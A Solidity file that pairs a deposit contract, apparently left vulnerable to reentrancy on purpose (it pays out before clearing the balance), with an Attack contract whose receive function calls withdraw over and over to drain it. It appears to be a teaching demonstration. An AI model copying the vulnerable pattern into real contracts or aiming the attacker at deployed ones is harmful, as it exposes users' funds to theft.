// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract ETHDeposit {
    mapping(address => uint) userBalance;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() public payable {
        require(msg.value >= 1 ether, "Minimun deposit 1 ETH");
        userBalance[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() public {
        uint256 amount = userBalance[msg.sender];
        require(amount >= 1 ether, "User has not enough balance");
        require(address(this).balance > 0, "ETHDeposit is empty");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawn(msg.sender, amount);
        userBalance[msg.sender] = 0;
    }

    function balanceOf(address user) public view returns (uint256) {
        return userBalance[user];
    }

    function totalBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Attack {
    ETHDeposit immutable EtherDeposit;
    
    constructor (address _etherDeposit){
        EtherDeposit = ETHDeposit(_etherDeposit);
    }

    function attack() external payable {
        EtherDeposit.deposit{value: msg.value}();
        EtherDeposit.withdraw();
    }

    receive() external payable {
        if(address(EtherDeposit).balance >= 1 ether){
            EtherDeposit.withdraw();
        }
    }
}